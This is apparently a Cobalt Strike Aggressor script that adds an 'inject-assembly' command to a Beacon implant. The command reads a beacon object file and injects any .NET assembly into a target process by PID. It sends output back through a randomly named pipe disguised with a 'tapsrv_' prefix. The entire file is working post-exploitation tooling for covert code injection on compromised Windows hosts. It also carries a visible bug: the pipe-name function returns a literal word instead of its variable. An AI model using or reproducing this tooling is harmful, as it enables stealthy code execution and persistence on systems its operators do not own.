import beacon.CommandBuilder;
import common.CommonUtils;

@alphabet = @("a","_","-","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");

sub random_pipe {

    $pipeName = "tapsrv_";

    $len = rand(12);

    for($i = 0; $i < $len; $i++){
            $pipeName .= rand(@alphabet);
        }
    return pipeName;
}

alias inject-assembly {
    $cmd = substr($0, 16);
    @args = split(' ', $cmd); 
    $pid = @args[0];


    $barch = barch( $1 );
    $iafs = openf( script_resource( "injectassembly. $+ $barch $+ .o") );
    $iarw = readb( $iafs, -1 );
    closef( $iafs );

    if ( @args[0] eq $null || @args[1] eq $null)
    {
        berror( $1, "Usage: inject-assembly pid assembly [args...]\n" );
        return;
    }

    if ( !-isnumber $pid )
    {
        berror( $1, "Invalid PID: $pid\n" );
        return;
    }
    else
    {
        if ( $pid eq 0 )
        {
            $pid = beacon_info( $1, "pid" );
        }
    }

    if ( !-exists @args[1] || !-isFile @args[1] )
    {
        berror($1, "Assembly file not found: ".@args[1]."\n");
        return;
    }

    $asmfs = openf( @args[1] );
    $asmrw = readb( $asmfs, -1 );
    $asmsize = strlen($asmrw);
    closef( $asmfs );

    @asmargarr = sublist(@args, 2, size(@args));
    $asmargs = "";
    foreach %arg (@asmargarr)
    {
        if ( !$asmargs )
        {
            $asmargs = %arg;
        }
        else
        {
            $asmargs = $asmargs . " " . %arg;
        }
    }

    if ( !$asmargs )
    {
        $asmargs = "NOARGS";
    }

    $pipen = "\\\\.\\pipe\\".random_pipe();

    #btask($1, "Assembly Path: ".@args[1]);
    #btask($1, "Size: ".$asmsize);
    #btask($1, "Pipe: ".$pipen);
    #btask($1, "Args: ".$asmargs);

    $argvs = bof_pack( $1, "zzzbz", $pid, $pipen, $asmsize, $asmrw, $asmargs );
    beacon_inline_execute( $1, $iarw, "go", $argvs );

    $build = [ new CommandBuilder ];
    [$build setCommand: 40];
    [$build addInteger: 0];
    [$build addShort: 32];
    [$build addShort: 15000];
    [$build addLengthAndString: $pipen];
    [$build addLengthAndString: "inject-assembly ".@args[1]];
    call( "beacons.task", $null, $1, cast( [$build build], 'b' ) );
}

beacon_command_register(
    "inject-assembly",
    "Execute a .NET assembly in any process",
    "  Usage: inject-assembly pid assembly [args...]\n".
    "  Specify 0 for pid to run in the current process"
);

